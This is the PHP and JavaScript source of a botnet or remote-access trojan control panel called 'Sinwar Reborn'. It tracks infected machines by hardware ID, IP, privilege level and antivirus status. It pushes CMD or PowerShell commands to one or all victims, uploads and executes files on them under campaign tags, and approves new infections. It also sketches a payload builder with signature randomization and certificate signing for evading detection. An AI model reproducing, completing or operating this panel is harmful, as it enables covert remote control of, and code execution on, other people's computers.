<?php
// donaldtrump.php
session_start();
if (!isset($_SESSION['auth'])) {
    header("Location: index.php");
    exit;
}

require 'db_config.php';

// Fetch initial data
try {
    $bots_query = $pdo->query("SELECT hwid, ip, country, user, privileges, os, uptime, status, client_version, tag, hostname, integrity FROM bots ORDER BY status DESC, last_seen DESC");
    $bots = $bots_query->fetchAll();

    // Updated query to join with 'bots' table for username and fetch 'raw_cmd'
    $pending_tasks_query = $pdo->query("
        SELECT 
            q.id, 
            q.hwid, 
            q.cmd, 
            q.raw_cmd, 
            q.sent, 
            q.created_at, 
            q.status_message, 
            b.user AS username 
        FROM 
            queue q 
        LEFT JOIN 
            bots b ON q.hwid = b.hwid 
        WHERE 
            q.sent = 0 
        ORDER BY 
            q.created_at DESC
    ");
    $pending_tasks = $pending_tasks_query->fetchAll();

    // Fetch unapproved clients count
    $unapproved_count_query = $pdo->query("SELECT COUNT(*) FROM rejected_packets");
    $unapproved_count = $unapproved_count_query->fetchColumn();

    $online_count = $pdo->query("SELECT COUNT(*) FROM bots WHERE status = 'Online'")->fetchColumn();
    $offline_count = $pdo->query("SELECT COUNT(*) FROM bots WHERE status = 'Offline'")->fetchColumn();
    $pending_count = count($pending_tasks);

} catch (PDOException $e) {
    die("Error fetching data: " . $e->getMessage());
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sinwar Reborn Management Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>

    <div class="container">
        <div class="sidebar">
            <div class="logo">Sinwar Reborn</div>
            <ul class="nav-menu">
                <li class="nav-item">
                    <a href="#" class="nav-link active">
                        <i class="fas fa-desktop"></i> Dashboard
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#" class="nav-link" id="queueTasksBtn">
                        <i class="fas fa-tasks"></i> Queue Tasks
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#" class="nav-link" id="buildAgentBtn">
                        <i class="fas fa-wrench"></i> Build Agent
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#" class="nav-link" id="unapprovedClientsBtn">
                        <i class="fas fa-bell"></i> Unapproved Clients <span id="unapprovedCount" class="notification-badge"><?php echo htmlspecialchars($unapproved_count); ?></span>
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#" class="nav-link" id="settingsBtn">
                        <i class="fas fa-cog"></i> Settings
                    </a>
                </li>
            </ul>
            <div class="sidebar-footer">
                <button class="logout-btn">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </button>
            </div>
        </div>

        <div class="main-content">
            <div class="header">
                <h1>Clients</h1>
            </div>

            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon online"><i class="fas fa-users"></i></div>
                    <div class="stat-info">
                        <h2 id="onlineCount"><?php echo htmlspecialchars($online_count); ?></h2>
                        <p>Online Clients</p>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon offline"><i class="fas fa-user-slash"></i></div>
                    <div class="stat-info">
                        <h2 id="offlineCount"><?php echo htmlspecialchars($offline_count); ?></h2>
                        <p>Offline Clients</p>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon pending"><i class="fas fa-hourglass-half"></i></div>
                    <div class="stat-info">
                        <h2 id="pendingCount"><?php echo htmlspecialchars($pending_count); ?></h2>
                        <p>Pending Tasks</p>
                    </div>
                </div>
            </div>

            <div class="clients-table-container">
                <div class="clients-table-scroll">
                    <table class="clients-table">
                        <thead>
                            <tr>
                                <th>Username</th>
                                <th>IP</th>
                                <th>OS</th>
                                <th>Version</th>
                                <th>Status</th>
                                <th>Tags</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="clientsTableBody">
                            <?php foreach ($bots as $bot): ?>
                            <tr data-hwid="<?php echo htmlspecialchars($bot['hwid']); ?>" data-version="<?php echo htmlspecialchars($bot['client_version'] ?? 'v1.0'); ?>">
                                <td><?php echo htmlspecialchars($bot['user']); ?></td>
                                <td><?php echo htmlspecialchars($bot['ip']); ?></td>
                                <td><?php echo htmlspecialchars($bot['os']); ?></td>
                                <td><?php echo htmlspecialchars($bot['client_version'] ?? 'v1.0'); ?></td>
                                <td><span class="status-badge status-<?php echo strtolower($bot['status']); ?>"><?php echo htmlspecialchars($bot['status']); ?></span></td>
                                <td><?php echo htmlspecialchars($bot['tag'] ?? 'N/A'); ?></td>
                                <td class="actions">
                                    <button class="action-btn info-btn" title="Client Info"><i class="fas fa-info-circle"></i></button>
                                    <button class="action-btn select-command-type-btn" title="Send specific command"><i class="fas fa-terminal"></i></button>
                                    <button class="action-btn update-client-btn" title="Update client"><i class="fas fa-arrow-alt-circle-up"></i></button>
                                    <button class="action-btn delete-bot-btn" title="Delete client"><i class="fas fa-trash"></i></button>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="command-bar">
                <select id="commandType">
                    <option value="cmd">CMD</option>
                    <option value="powershell">PowerShell</option>
                </select>
                <input type="text" id="commandInput" placeholder="Enter command to send to all online clients...">
                <button id="sendCommandBtn">Send Command</button>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="tasksModal">
        <div class="modal">
            <div class="modal-header">
                <h2>Pending Tasks Queue</h2>
                <button id="clearAllTasksBtn" class="confirm-btn">Clear All Tasks</button>
                <button class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div class="clients-table-container">
                    <div class="clients-table-scroll">
                        <table class="clients-table">
                            <thead>
                                <tr class="task-list-header">
                                    <th>Username</th> <!-- Changed from Client HWID -->
                                    <th>Command</th>
                                    <th>Status</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody id="taskList">
                                <?php foreach ($pending_tasks as $task): ?>
                                    <tr class="task-list-item" data-id="<?php echo htmlspecialchars($task['id']); ?>">
                                        <td><?php echo htmlspecialchars($task['username'] ?? $task['hwid']); ?></td>
                                        <td class="task-command" title="Full command: <?php echo htmlspecialchars($task['cmd']); ?>"><?php echo htmlspecialchars($task['raw_cmd'] ?? $task['cmd']); ?></td>
                                        <td class="task-status">
                                            <?php
                                                $statusClass = 'pending-dot';
                                                $statusText = 'pending';
                                                if ($task['status_message']) {
                                                    if (strpos($task['status_message'], 'error') !== false || strpos($task['status_message'], 'denied') !== false || strpos($task['status_message'], 'failed') !== false) {
                                                        $statusClass = 'error-dot';
                                                    } else if (strpos($task['status_message'], 'completed') !== false || strpos($task['status_message'], 'executed') !== false) {
                                                        $statusClass = 'completed-dot';
                                                    }
                                                    $statusText = htmlspecialchars($task['status_message']);
                                                }
                                            ?>
                                            <span class="dot <?php echo $statusClass; ?>"></span>
                                            <?php echo $statusText; ?>
                                        </td>
                                        <td>
                                            <button class="action-btn delete-task-btn" title="Delete task"><i class="fas fa-trash"></i></button>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
                <div class="modal-actions" style="justify-content: flex-end;">
                    <button class="cancel-btn">Close</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="confirmClearTasksModal">
        <div class="modal">
            <div class="modal-header">
                <h2>Confirm Action</h2>
                <button class="close-btn" data-close-modal="confirmClearTasksModal">&times;</button>
            </div>
            <div class="modal-body">
                <p>Are you sure you want to clear all pending tasks?</p>
                <div class="modal-actions">
                    <button id="confirmClearTasksBtn" class="confirm-btn">OK</button>
                    <button class="cancel-btn" data-close-modal="confirmClearTasksModal">Cancel</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="singleClientCommandTypeModal">
        <div class="modal small-modal"> <div class="modal-header">
                <h2>Send Command to <span id="commandTypeBotUser"></span></h2>
                <button class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <p>Choose command type:</p>
                <div class="modal-actions command-type-selection">
                    <button class="confirm-btn" id="selectCmdBtn">CMD</button>
                    <button class="confirm-btn" id="selectPowershellBtn">PowerShell</button>
                </div>
                <form id="singleCommandForm" style="display:none; margin-top: 20px;">
                    <input type="hidden" id="singleCommandHwid" name="hwid">
                    <input type="hidden" id="singleCommandType" name="command_type">
                    <div class="form-group">
                        <label for="singleCommandInput">Command</label>
                        <input type="text" id="singleCommandInput" name="command" required placeholder="">
                    </div>
                    <div class="modal-actions">
                        <button type="button" class="cancel-btn">Cancel</button>
                        <button type="submit" class="confirm-btn">Send</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal-overlay" id="deleteBotModal">
        <div class="modal">
            <div class="modal-header">
                <h2>Delete Bot</h2>
                <button class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <p>Are you sure you want to delete <strong id="deleteBotUser"></strong>?</p>
                <form id="deleteBotForm">
                    <input type="hidden" id="deleteBotHwid" name="hwid">
                    <div class="modal-actions">
                        <button type="button" class="cancel-btn">Cancel</button>
                        <button type="submit" class="confirm-btn">Delete</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="updateClientModal">
        <div class="modal">
            <div class="modal-header">
                <h2>Update Client(s)</h2>
                <button class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <form id="updateClientForm">
                    <div class="form-group">
                        <label for="updateFile">Upload File</label>
                        <input type="file" id="updateFile" name="updateFile" required>
                    </div>
                    <div class="form-group">
                        <label for="tagInput">Tag (Optional)</label>
                        <input type="text" id="tagInput" name="tag" placeholder="e.g., campaign-1">
                    </div>
                    <div class="modal-actions">
                        <button type="button" class="cancel-btn">Cancel</button>
                        <button type="submit" class="upload-btn">Upload & Execute</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="clientInfoModal">
        <div class="modal">
            <div class="modal-header">
                <h2>Client Details: <span id="clientInfoUser"></span></h2>
                <button class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div class="info-grid">
                    <div class="info-item"><label>HWID:</label><span id="infoHwid"></span></div>
                    <div class="info-item"><label>IP:</label><span id="infoIp"></span></div>
                    <div class="info-item"><label>OS:</label><span id="infoOs"></span></div>
                    <div class="info-item"><label>Version:</label><span id="infoVersion"></span></div>
                    <div class="info-item"><label>Hostname:</label><span id="infoHostname"></span></div>
                    <div class="info-item"><label>Integrity:</label><span id="infoIntegrity"></span></div>
                    <div class="info-item"><label>Uptime:</label><span id="infoUptime"></span></div>
                    <div class="info-item"><label>Sleep Interval:</label><span id="infoSleep"></span></div>
                    <div class="info-item"><label>Tags:</label><span id="infoTags"></span></div>
                    <div class="info-item"><label>Antivirus:</label><span id="infoAvStatus"></span></div>
                </div>
                <div class="output-section">
                    <h3>Command Output</h3>
                    <pre id="commandOutputDisplay">No output available yet...</pre>
                </div>
            </div>
        </div>
    </div>

        <div class="modal-overlay" id="buildAgentModal">
            <div class="modal">
                <div class="modal-header">
                    <h2>Build Agent</h2>
                    <button class="close-btn">&times;</button>
                </div>
                <div class="modal-body">
                    <form id="buildAgentForm">
                        <div class="form-group">
                            <label for="fileType">File Type</label>
                            <select id="fileType">
                                <option value="exe">EXE</option>
                                <option value="vbs">VBS</option>
                                <option value="bat">BAT</option>
                                <option value="ps1">PS1</option>
                                <option value="shellcode">Shellcode</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>
                                <input type="checkbox" id="uniqueStubCheckbox"> Unique Stub (Signature Randomization)
                            </label>
                        </div>
                        <div class="form-group">
                            <label for="versionInfo">Version</label>
                            <input type="text" id="versionInfo" value="v2.0" disabled>
                        </div>
                        <div class="form-group" id="certUploadGroup" style="display:none;">
                            <label for="certUpload">Upload Certificate (.pfx)</label>
                            <input type="file" id="certUpload">
                        </div>
                    </form>
                    <div class="modal-actions build-controls">
                        <button class="confirm-btn" disabled>Build Agent (Coming Soon)</button>
                        <button class="upload-btn" disabled>Download</button>
                        <button class="logout-btn" disabled>Delete</button>
                    </div>
                </div>
            </div>
        </div>

    <div class="modal-overlay" id="unapprovedClientsModal">
        <div class="modal">
            <div class="modal-header">
                <h2>Unapproved Clients</h2>
                <button class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div class="clients-table-container">
                    <div class="clients-table-scroll">
                        <table class="clients-table">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>HWID</th>
                                    <th>IP</th>
                                    <th>Raw Content</th>
                                    <th>Reason</th>
                                    <th>Timestamp</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody id="unapprovedClientsTableBody">
                                </tbody>
                        </table>
                    </div>
                </div>
                <div class="modal-actions" style="justify-content: flex-end;">
                    <button class="cancel-btn">Close</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="settingsModal">
        <div class="modal">
            <div class="modal-header">
                <h2>Settings</h2>
                <button class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <form id="changePasswordForm">
                    <div class="form-group">
                        <label for="currentPassword">Current Password</label>
                        <input type="password" id="currentPassword" name="currentPassword" required>
                    </div>
                    <div class="form-group">
                        <label for="newPassword">New Password</label>
                        <input type="password" id="newPassword" name="newPassword" required>
                    </div>
                    <div class="form-group">
                        <label for="confirmNewPassword">Confirm New Password</label>
                        <input type="password" id="confirmNewPassword" name="confirmNewPassword" required>
                    </div>
                    <div class="modal-actions">
                        <button type="button" class="cancel-btn">Cancel</button>
                        <button type="submit" class="confirm-btn">Change Password</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div id="siteNotification" class="notification"></div>
    <audio id="notificationBeep" src="new_client.mp3" preload="auto"></audio>

    <script>
    const clientsTableBody = document.getElementById('clientsTableBody');
    const onlineCount = document.getElementById('onlineCount');
    const offlineCount = document.getElementById('offlineCount');
    const pendingCount = document.getElementById('pendingCount');
    const commandInput = document.getElementById('commandInput');
    const commandType = document.getElementById('commandType');
    const sendCommandBtn = document.getElementById('sendCommandBtn');
    const tasksModal = document.getElementById('tasksModal');
    const queueTasksBtn = document.getElementById('queueTasksBtn');
    const clearAllTasksBtn = document.getElementById('clearAllTasksBtn');
    const notification = document.getElementById('siteNotification');
    const notificationBeep = document.getElementById('notificationBeep');

    const singleCommandHwidInput = document.getElementById('singleCommandHwid');
    const singleCommandForm = document.getElementById('singleCommandForm');

    const deleteBotModal = document.getElementById('deleteBotModal');
    const deleteBotHwidInput = document.getElementById('deleteBotHwid');
    const deleteBotForm = document.getElementById('deleteBotForm');
    const deleteBotUser = document.getElementById('deleteBotUser');

    const updateClientModal = document.getElementById('updateClientModal');
    const updateClientForm = document.getElementById('updateClientForm');

    const clientInfoModal = document.getElementById('clientInfoModal');
    const infoHwid = document.getElementById('infoHwid');
    const infoIp = document.getElementById('infoIp');
    const infoOs = document.getElementById('infoOs');
    const infoVersion = document.getElementById('infoVersion');
    const infoHostname = document.getElementById('infoHostname');
    const infoIntegrity = document.getElementById('infoIntegrity');
    const infoUptime = document.getElementById('infoUptime');
    const infoSleep = document.getElementById('infoSleep');
    const infoTags = document.getElementById('infoTags');
    const infoAvStatus = document.getElementById('infoAvStatus');
    const commandOutputDisplay = document.getElementById('commandOutputDisplay');

    const buildAgentModal = document.getElementById('buildAgentModal');
    const buildAgentBtn = document.getElementById('buildAgentBtn');
    const fileTypeSelect = document.getElementById('fileType');
    const certUploadGroup = document.getElementById('certUploadGroup');

    const confirmClearTasksModal = document.getElementById('confirmClearTasksModal');
    const confirmClearTasksBtn = document.getElementById('confirmClearTasksBtn');

    const singleClientCommandTypeModal = document.getElementById('singleClientCommandTypeModal');
    const commandTypeBotUser = document.getElementById('commandTypeBotUser');
    const selectCmdBtn = document.getElementById('selectCmdBtn');
    const selectPowershellBtn = document.getElementById('selectPowershellBtn');
    const singleCommandInput = document.getElementById('singleCommandInput');
    const singleCommandType = document.getElementById('singleCommandType');

    // NEW: Unapproved Clients elements
    const unapprovedClientsBtn = document.getElementById('unapprovedClientsBtn');
    const unapprovedClientsModal = document.getElementById('unapprovedClientsModal');
    const unapprovedClientsTableBody = document.getElementById('unapprovedClientsTableBody');
    const unapprovedCountBadge = document.getElementById('unapprovedCount');

    // NEW: Settings elements
    const settingsBtn = document.getElementById('settingsBtn');
    const settingsModal = document.getElementById('settingsModal');
    const changePasswordForm = document.getElementById('changePasswordForm');


    let knownHwids = new Set(
        [...clientsTableBody.querySelectorAll('tr')].map(row => row.dataset.hwid)
    );
    let pendingCommandIds = new Set();
    let currentSelectedHwid = '';

    clientsTableBody.addEventListener('click', async (e) => {
        const row = e.target.closest('tr');
        if (!row) return;

        const hwid = row.dataset.hwid;
        const username = row.querySelector('td:first-child').textContent; // Assuming username is the first td

        if (e.target.closest('.select-command-type-btn')) {
            currentSelectedHwid = hwid;
            commandTypeBotUser.textContent = username;
            singleClientCommandTypeModal.classList.add('active');
            singleCommandForm.style.display = 'none';
            singleCommandInput.value = '';
            singleCommandInput.placeholder = '';
        } else if (e.target.closest('.delete-bot-btn')) {
            deleteBotHwidInput.value = hwid;
            deleteBotUser.textContent = username;
            deleteBotModal.classList.add('active');
        } else if (e.target.closest('.update-client-btn')) {
            updateClientModal.classList.add('active');
        } else if (e.target.closest('.info-btn')) {
            await fetchAndDisplayClientInfo(hwid);
            clientInfoModal.classList.add('active');
        }
    });

    document.querySelectorAll('.modal .close-btn, .modal-actions .cancel-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const modalToClose = btn.closest('.modal-overlay');
            if (modalToClose) {
                modalToClose.classList.remove('active');
            }
            if (modalToClose && modalToClose.id === 'singleClientCommandTypeModal') {
                singleCommandForm.style.display = 'none';
                singleCommandInput.value = '';
                singleCommandInput.placeholder = '';
            }
            // Clear password fields on settings modal close
            if (modalToClose && modalToClose.id === 'settingsModal') {
                changePasswordForm.reset();
            }
        });
    });

    selectCmdBtn.addEventListener('click', () => {
        singleCommandType.value = 'cmd'; // Changed to lowercase for consistency with backend
        singleCommandHwidInput.value = currentSelectedHwid;
        singleCommandInput.placeholder = 'Enter CMD command (e.g., dir, whoami)';
        singleCommandForm.style.display = 'block';
    });

    selectPowershellBtn.addEventListener('click', () => {
        singleCommandType.value = 'powershell'; // Changed to lowercase for consistency with backend
        singleCommandHwidInput.value = currentSelectedHwid;
        singleCommandInput.placeholder = 'Enter PowerShell command (e.g., Get-Process, Get-Service)';
        singleCommandForm.style.display = 'block';
    });

    queueTasksBtn.addEventListener('click', () => {
        tasksModal.classList.add('active');
    });

    buildAgentBtn.addEventListener('click', () => {
        buildAgentModal.classList.add('active');
    });

    unapprovedClientsBtn.addEventListener('click', async () => {
        await fetchAndDisplayUnapprovedClients();
        unapprovedClientsModal.classList.add('active');
    });

    settingsBtn.addEventListener('click', () => {
        settingsModal.classList.add('active');
    });

    document.getElementById('taskList').addEventListener('click', async (e) => {
        if (e.target.closest('.delete-task-btn')) {
            const taskId = e.target.closest('.task-list-item').dataset.id;
            await postData('api.php', { action: 'deleteQueueItem', id: taskId });
        }
    });

    unapprovedClientsTableBody.addEventListener('click', async (e) => {
        const row = e.target.closest('tr');
        if (!row) return;

        const id = row.dataset.id;
        const hwid = row.dataset.hwid;
        const ip = row.dataset.ip;
        const rawContent = row.dataset.rawContent;
        const reason = row.dataset.reason;
        const timestamp = row.dataset.timestamp;

        if (e.target.closest('.approve-client-btn')) {
            await postData('api.php', {
                action: 'approveClient',
                id: id,
                hwid: hwid,
                ip: ip,
                raw_content: rawContent,
                reason: reason,
                timestamp: timestamp
            });
            await fetchAndDisplayUnapprovedClients();
        } else if (e.target.closest('.deny-client-btn')) {
            await postData('api.php', { action: 'denyClient', id: id });
            await fetchAndDisplayUnapprovedClients();
        }
    });

    clearAllTasksBtn.addEventListener('click', () => {
        confirmClearTasksModal.classList.add('active');
    });

    confirmClearTasksBtn.addEventListener('click', async () => {
        await postData('api.php', { action: 'clearQueue' });
        confirmClearTasksModal.classList.remove('active');
        tasksModal.classList.remove('active');
    });

    fileTypeSelect.addEventListener('change', (e) => {
        certUploadGroup.style.display = e.target.value === 'exe' ? 'block' : 'none';
    });

    singleCommandForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const command = e.target.querySelector('#singleCommandInput').value;
        const hwid = e.target.querySelector('#singleCommandHwid').value;
        const commandType = e.target.querySelector('#singleCommandType').value;

        await postData('api.php', { action: 'sendCommand', command: command, hwid: hwid, command_type: commandType });
        singleClientCommandTypeModal.classList.remove('active');
        e.target.reset();
        singleCommandForm.style.display = 'none';
    });

    deleteBotForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const hwid = e.target.querySelector('#deleteBotHwid').value;
        await postData('api.php', { action: 'deleteBot', hwid });
        deleteBotModal.classList.remove('active');
    });

    updateClientForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        await postData('api.php?action=uploadAndUpdate', formData, true);
        updateClientModal.classList.remove('active');
        e.target.reset();
    });

    changePasswordForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const currentPassword = document.getElementById('currentPassword').value;
        const newPassword = document.getElementById('newPassword').value;
        const confirmNewPassword = document.getElementById('confirmNewPassword').value;

        if (newPassword !== confirmNewPassword) {
            showNotification('New passwords do not match.', 'error');
            return;
        }

        await postData('api.php', {
            action: 'changePassword',
            current_password: currentPassword,
            new_password: newPassword
        });
        settingsModal.classList.remove('active');
        e.target.reset();
    });

    sendCommandBtn.addEventListener('click', async () => {
        const command = commandInput.value.trim();
        if (!command) {
            showNotification('Command cannot be empty.', 'error');
            return;
        }
        const type = commandType.value;
        
        await postData('api.php', { action: 'sendCommandToAll', command: command, command_type: type });
        commandInput.value = '';
    });

    async function postData(url, data, isFormData = false) {
        try {
            if (data.action && (data.action.includes('send') || data.action.includes('update') || data.action.includes('approve') || data.action.includes('deny') || data.action.includes('changePassword'))) {
                showNotification('Executing task, awaiting response...', 'pending');
            }

            const fetchOptions = {
                method: 'POST',
            };
            if (isFormData) {
                fetchOptions.body = data;
            } else {
                fetchOptions.headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
                fetchOptions.body = new URLSearchParams(data);
            }

            const response = await fetch(url, fetchOptions);
            const result = await response.json();

            // Only show notification if it's not a background send/update that will be handled by refreshData
            // The logic was slightly off for notifications before, this should make it more precise
            if (!((data.action === 'sendCommand' || data.action === 'sendCommandToAll') && result.success)) {
                showNotification(result.message, result.success ? 'success' : 'error');
            }
            
            // Trigger a refresh after any action that might change data visible on the dashboard/queue
            await refreshData();
        } catch (error) {
            console.error('Error:', error);
            showNotification('An error occurred.', 'error');
        }
    }

    async function fetchAndDisplayClientInfo(hwid) {
        try {
            const response = await fetch(`api.php?action=getBotInfo&hwid=${hwid}`);
            const data = await response.json();
            if (data.success) {
                const info = data.info;
                document.getElementById('clientInfoUser').textContent = info.user || 'N/A';

                infoHwid.textContent = info.hwid || 'N/A';
                infoIp.textContent = info.ip || 'N/A';
                infoOs.textContent = info.os || 'N/A';
                infoVersion.textContent = info.client_version || 'v1.0';
                infoHostname.textContent = info.hostname || 'N/A';
                infoIntegrity.textContent = info.integrity || 'N/A';
                infoUptime.textContent = info.uptime || 'N/A';
                infoSleep.textContent = info.sleep_interval || 'N/A';
                infoTags.textContent = info.tag || 'N/A';
                infoAvStatus.textContent = info.antivirus_status || 'N/A';
                commandOutputDisplay.textContent = data.output || 'No output available.';
            } else {
                showNotification(data.message, 'error');
            }
        } catch (error) {
            console.error('Failed to fetch client info:', error);
            showNotification('Failed to fetch client info.', 'error');
        }
    }

    async function fetchAndDisplayUnapprovedClients() {
        try {
            const response = await fetch('api.php?action=getUnapprovedClients');
            const data = await response.json();
            if (data.success) {
                unapprovedClientsTableBody.innerHTML = data.clients.map(client => `
                    <tr data-id="${client.id}" data-hwid="${client.hwid}" data-ip="${client.ip}" data-raw-content="${encodeURIComponent(client.raw_content)}" data-reason="${encodeURIComponent(client.reason)}" data-timestamp="${client.timestamp}">
                        <td>${client.id}</td>
                        <td>${client.hwid}</td>
                        <td>${client.ip}</td>
                        <td class="task-command" title="Click to copy">${client.raw_content}</td>
                        <td>${client.reason}</td>
                        <td>${client.timestamp}</td>
                        <td class="actions">
                            <button class="action-btn approve-client-btn" title="Approve Client"><i class="fas fa-check-circle"></i> Approve</button>
                            <button class="action-btn deny-client-btn" title="Deny Client"><i class="fas fa-times-circle"></i> Deny</button>
                        </td>
                    </tr>
                `).join('');
                unapprovedCountBadge.textContent = data.clients.length;
            } else {
                showNotification(data.message, 'error');
                unapprovedClientsTableBody.innerHTML = `<tr><td colspan="7">Error loading unapproved clients.</td></tr>`;
                unapprovedCountBadge.textContent = '0';
            }
        } catch (error) {
            console.error('Failed to fetch unapproved clients:', error);
            showNotification('Failed to fetch unapproved clients.', 'error');
            unapprovedClientsTableBody.innerHTML = `<tr><td colspan="7">Failed to connect to server.</td></tr>`;
            unapprovedCountBadge.textContent = '0';
        }
    }

    function showNotification(message, type) {
        notification.textContent = message;
        notification.className = `notification show ${type}`;
        setTimeout(() => {
            notification.classList.remove('show');
            notification.style.animation = 'none';
        }, 3000);
    }

    function playBeep() {
        notificationBeep.play().catch(e => console.error("Could not play audio:", e));
    }

    let firstLoad = true;

    async function refreshData() {
        try {
            const response = await fetch('api.php?action=getData');
            const data = await response.json();

            const newHwids = new Set(data.bots.map(bot => bot.hwid));
            const newConnections = [...newHwids].filter(hwid => !knownHwids.has(hwid));
            if (newConnections.length > 0 && !firstLoad) {
                playBeep();
                showNotification(`New client(s) connected: ${newConnections.join(', ')}`, 'success');
            }
            knownHwids = newHwids;

            onlineCount.textContent = data.online_count;
            offlineCount.textContent = data.offline_count;
            pendingCount.textContent = data.pending_count;
            unapprovedCountBadge.textContent = data.unapproved_count;

            clientsTableBody.innerHTML = data.bots.map(bot => `
                <tr data-hwid="${bot.hwid}" data-version="${bot.client_version ?? 'v1.0'}">
                    <td>${bot.user}</td>
                    <td>${bot.ip}</td>
                    <td>${bot.os}</td>
                    <td>${bot.client_version ?? 'v1.0'}</td>
                    <td><span class="status-badge status-${bot.status.toLowerCase()}">${bot.status}</span></td>
                    <td>${bot.tag ?? 'N/A'}</td>
                    <td class="actions">
                        <button class="action-btn info-btn" title="Client Info"><i class="fas fa-info-circle"></i></button>
                        <button class="action-btn select-command-type-btn" title="Send specific command"><i class="fas fa-terminal"></i></button>
                        <button class="action-btn update-client-btn" title="Update client"><i class="fas fa-arrow-alt-circle-up"></i></button>
                        <button class="action-btn delete-bot-btn" title="Delete client"><i class="fas fa-trash"></i></button>
                    </td>
                </tr>
            `).join('');

            const taskList = document.getElementById('taskList');
            let newPendingTasks = false;
            const newPendingCommandIds = new Set();
            const updatedTasks = new Map(); // Store task ID and its new status message

            const tasksHtml = data.pending_tasks.map(task => {
                newPendingCommandIds.add(task.id);
                if (!pendingCommandIds.has(task.id)) {
                    newPendingTasks = true;
                }

                // Track changes in status_message for notifications
                if (pendingCommandIds.has(task.id) && task.status_message && task.status_message !== 'pending') {
                    // Only add to updatedTasks if the status *changed* from a previous fetch
                    // This simple check might not be perfect for all state transitions but helps
                    const existingTaskElement = document.querySelector(`tr[data-id="${task.id}"]`);
                    if (existingTaskElement) {
                        const currentStatusText = existingTaskElement.querySelector('.task-status').textContent.trim();
                        if (currentStatusText !== task.status_message) {
                            updatedTasks.set(task.id, task.status_message);
                        }
                    }
                } else if (!pendingCommandIds.has(task.id)) {
                    // For truly new tasks, if they somehow already have a status other than 'pending'
                    if (task.status_message && task.status_message !== 'pending') {
                         updatedTasks.set(task.id, task.status_message);
                    }
                }

                let statusClass = 'pending-dot';
                let statusText = 'pending';
                if (task.status_message) {
                    if (task.status_message.includes('error') || task.status_message.includes('denied') || task.status_message.includes('failed')) {
                        statusClass = 'error-dot';
                    } else if (task.status_message.includes('completed') || task.status_message.includes('executed')) {
                        statusClass = 'completed-dot';
                    }
                    statusText = task.status_message; // Use the actual message from DB
                }
                
                // Prioritize raw_cmd for display, fall back to cmd if raw_cmd is null
                const commandToDisplay = (task.raw_cmd && task.raw_cmd !== 'null') ? task.raw_cmd : task.cmd;
                const usernameToDisplay = task.username || task.hwid; // Use username, fallback to hwid

                return `
                    <tr class="task-list-item" data-id="${task.id}">
                        <td>${usernameToDisplay}</td>
                        <td class="task-command" title="Full command (encoded): ${task.cmd}">${commandToDisplay}</td>
                        <td class="task-status">
                            <span class="dot ${statusClass}"></span>
                            ${statusText}
                        </td>
                        <td>
                            <button class="action-btn delete-task-btn" title="Delete task"><i class="fas fa-trash"></i></button>
                        </td>
                    </tr>
                `;
            }).join('');

            if (newPendingTasks && !firstLoad) {
                playBeep();
                showNotification('New task(s) added to the queue.', 'pending');
            }

            // Corrected selector: target <tr> directly
            updatedTasks.forEach((message, id) => {
                const taskElement = document.querySelector(`tr[data-id="${id}"]`);
                if (taskElement) {
                    // Get the command text currently displayed (raw_cmd or cmd)
                    const commandText = taskElement.querySelector('.task-command').textContent;
                    if (message.includes('completed') || message.includes('executed')) {
                        showNotification(`Command for '${commandText}' on ${taskElement.querySelector('td:first-child').textContent} completed.`, 'success');
                    } else if (message.includes('error') || message.includes('denied') || message.includes('failed')) {
                        showNotification(`Command for '${commandText}' on ${taskElement.querySelector('td:first-child').textContent} failed: ${message}.`, 'error');
                    }
                }
            });

            taskList.innerHTML = tasksHtml;
            pendingCommandIds = newPendingCommandIds;
            firstLoad = false;

        } catch (error) {
            console.error('Failed to fetch data:', error);
        }
    }

    setInterval(refreshData, 5000);
    refreshData();
    </script>
</body>
</html>
